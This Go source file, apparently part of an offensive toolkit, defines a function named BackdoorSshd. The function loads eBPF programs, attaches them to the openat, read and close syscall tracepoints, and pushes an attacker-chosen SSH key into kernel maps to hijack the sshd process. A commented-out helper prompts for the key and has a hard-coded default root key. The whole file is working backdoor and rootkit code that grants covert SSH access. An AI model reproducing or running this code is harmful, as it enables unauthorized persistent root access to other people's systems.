package sshd

import (
	"os"
	"os/signal"
	"syscall"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/rlimit"
	log "github.com/sirupsen/logrus"
)

const (
	bpfFSPath = "/sys/fs/bpf"
)

// Name of the kernel function to trace.

func BackdoorSshd(payload string) (err error) {
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	// remove rlimit
	if err := rlimit.RemoveMemlock(); err != nil {
		return err
	}

	objs := bpfObjects{}
	// load eBPF Objects
	log.Info("load eBPF Objects")
	if err := loadBpfObjects(&objs, &ebpf.CollectionOptions{
		Maps: ebpf.MapOptions{
			PinPath: bpfFSPath,
		},
	}); err != nil {
		log.Fatalf("load ebpf objects error: %v", err)
		return err
	}
	defer objs.Close()

	// link tracepoints
	tp_enopen, err := link.Tracepoint("syscalls", "sys_enter_openat", objs.HandleOpenatEnter, nil)
	tp_exopen, err := link.Tracepoint("syscalls", "sys_exit_openat", objs.HandleOpenatExit, nil)
	tp_enread, err := link.Tracepoint("syscalls", "sys_enter_read", objs.HandleReadEnter, nil)
	tp_exread, err := link.Tracepoint("syscalls", "sys_exit_read", objs.HandleReadExit, nil)
	tp_exclose, err := link.Tracepoint("syscalls", "sys_exit_close", objs.HandleCloseExit, nil)

	if err != nil {
		log.Fatal(err)
		return err
	}

	defer tp_enopen.Close()
	defer tp_exopen.Close()
	defer tp_enread.Close()
	defer tp_exread.Close()
	defer tp_exclose.Close()

	log.Info("inject ebpf program into file system success")
	// Send payload
	// err = SendKey(objs, ReadInputAsKey(stopper))
	err = SendKey(objs, payload)
	if err != nil {
		log.Panicln(err)
	}
	log.Info("Send to kernel mode successful")
	<-stopper
	return nil
}

// func ReadInputAsKey(block chan os.Signal) (key string) {
// 	_ = survey.AskOne(&survey.Input{
// 		Message: "You need input a ssh key to send to hijack sshd process\n",
// 		Default: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOZOTdoCvyxP9XOxKvlspxRszDhgOH7xcAQGYPqKGiVM root",
// 	}, &key)
// 	if key == "exit" {
// 		block <- os.Interrupt
// 	}
// 	log.Info("Your Key set is ", key)
// 	return
// }
